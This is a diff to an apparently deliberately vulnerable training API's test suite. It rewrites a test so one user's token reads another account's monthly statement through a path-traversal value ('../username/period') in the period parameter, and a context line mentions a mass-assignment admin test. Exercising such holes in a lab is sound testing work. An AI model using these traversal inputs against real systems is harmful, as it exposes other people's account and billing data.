@@ -53,18 +53,41 @@ describe('VulnAPI-inspired realistic challenges', function () {
     expect(wsdl.text).to.include('definitions');
   });
 
-  it('reads a synthetic sibling report through period path traversal', async function () {
+  it('reads another account’s generated monthly statement through period path traversal', async function () {
+    const username = `report_owner_${Date.now()}`;
+    const email = `${username}@dvws.local`;
+    const created = await request.post('/api/v2/users').send({ username, password: 'Report123!', email });
+    expect(created.status).to.eql(201);
+    const ownerLogin = await request.post('/api/v2/login').send({ username, password: 'Report123!' });
+    expect(ownerLogin.status).to.eql(200);
+    const ownerToken = ownerLogin.body.token;
+
+    const period = new Date().toISOString().slice(0, 7);
+    const initialReport = await request.get('/api/v2/reports/monthly')
+      .set('Authorization', `Bearer ${ownerToken}`)
+      .query({ period });
+    expect(initialReport.status).to.eql(200);
+    expect(initialReport.body.statement.totalCreditsBilled).to.eql(0);
+
+    const purchase = await request.post('/api/v2/resource-store/orders')
+      .set('Authorization', `Bearer ${ownerToken}`)
+      .send({ itemId: 'api-monitor', quantity: 2 });
+    expect(purchase.status).to.eql(201);
+
     const ordinary = await request.get('/api/v2/reports/monthly')
-      .set('Authorization', `Bearer ${token}`)
-      .query({ period: '2026-09' });
+      .set('Authorization', `Bearer ${ownerToken}`)
+      .query({ period });
     expect(ordinary.status).to.eql(200);
-    expect(ordinary.body.report).to.eql('Monthly exchange rate summary');
+    expect(ordinary.body.account).to.eql({ username, email });
+    expect(ordinary.body.statement.totalCreditsBilled).to.eql(20);
 
     const traversed = await request.get('/api/v2/reports/monthly')
       .set('Authorization', `Bearer ${token}`)
-      .query({ period: '../internal/support-summary' });
+      .query({ period: `../${username}/${period}` });
     expect(traversed.status).to.eql(200);
-    expect(traversed.body.classification).to.eql('internal training data');
+    expect(traversed.body.account.username).to.eql(username);
+    expect(traversed.body.statement.orders[0].itemName).to.eql('API Monitor');
+    expect(traversed.body.statement.totalCreditsBilled).to.eql(20);
   });
 
   it('allows a settings update to mass-assign the admin field', async function () {
